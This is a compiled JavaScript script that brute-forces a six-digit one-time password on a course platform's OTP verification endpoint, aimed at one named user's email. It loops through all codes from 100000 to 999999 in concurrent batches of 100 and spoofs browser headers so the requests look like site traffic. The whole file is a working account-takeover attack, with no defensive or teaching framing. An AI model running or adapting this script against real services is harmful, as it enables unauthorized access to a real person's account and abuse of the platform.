"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
function sendRequest(otp) {
    return __awaiter(this, void 0, void 0, function* () {
        let config = {
            method: 'get',
            maxBodyLength: Infinity,
            url: `https://harkiratapi.classx.co.in/get/otpverify?useremail=hkirat.iit%40gmail.com&otp=${otp}%27&device_id=`,
            headers: {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.5',
                'auth-key': 'appxapi',
                'client-service': 'Appx',
                'device-type': '',
                'origin': 'https://harkirat.classx.co.in',
                'priority': 'u=1, i',
                'referer': 'https://harkirat.classx.co.in/',
                'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'sec-gpc': '1',
                'source': 'website',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
            }
        };
        try {
            const res = yield axios_1.default.request(config);
            console.log(res.data);
        }
        catch (error) {
        }
    });
}
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        for (let i = 100000; i < 1000000; i += 100) {
            const promises = [];
            console.log("here for " + i);
            for (let j = 0; j < 100; j++) {
                promises.push(sendRequest(i + j));
            }
            yield Promise.all(promises);
        }
    });
}
main();
